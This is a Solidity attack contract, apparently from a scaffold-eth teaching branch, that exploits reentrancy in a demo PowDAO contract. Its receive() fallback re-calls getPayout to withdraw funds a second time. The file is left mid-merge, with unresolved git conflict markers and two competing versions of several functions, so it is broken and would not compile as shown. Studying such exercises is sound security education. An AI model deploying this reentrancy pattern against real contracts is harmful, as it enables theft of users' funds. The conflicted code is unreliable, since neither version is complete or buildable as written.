// Code snippets from scaffoth-eth reentrancy-ex branch

pragma solidity >=0.6.0 <0.7.0;

import "./PowDAO.sol";
import "hardhat/console.sol";

contract ReEntrancyAttack {
    event Withdraw(address sender, uint256 amount);
    PowDAO powdao;
    bool hasAttacked;

    constructor(address payable contractAddress) public { 
        hasAttacked = false;
        powdao = PowDAO(contractAddress);
        console.log(contractAddress.balance);
<<<<<<< HEAD
        powdao.submitProposal(1*10**18, "Super important proposal, vote YES!");
=======
>>>>>>> 87937fee2dd4107e9919c720701779458ea240c4
    }

    function deposit() public payable {
        powdao.deposit{value:msg.value}();
    }

    function withdraw() public {
        console.log("Withdrawing from PowDAO with gas ", gasleft());
<<<<<<< HEAD
        //powdao.getPayoutUnsafe(address(this));
    }

    function submitProposal() public {
        powdao.submitProposal(1*10**18, "Super important proposal, vote YES!");
=======
        powdao.getPayout(address(this));
    }

    function submitProposal() public {
        powdao.submitProposal(.01*10**18, "test reentrancy");
>>>>>>> 87937fee2dd4107e9919c720701779458ea240c4
    }

    receive() external payable {
        console.log("Not attacked yet with gas ", gasleft());
        if(!hasAttacked){
            console.log("Withdrawing from powdao");
<<<<<<< HEAD
            //powdao.getPayoutUnsafe(address(this));
=======
            powdao.getPayout(address(this));
>>>>>>> 87937fee2dd4107e9919c720701779458ea240c4
            hasAttacked = true;
        }
        console.log("Done attacking");
    }
<<<<<<< HEAD
}
=======
}
>>>>>>> 87937fee2dd4107e9919c720701779458ea240c4
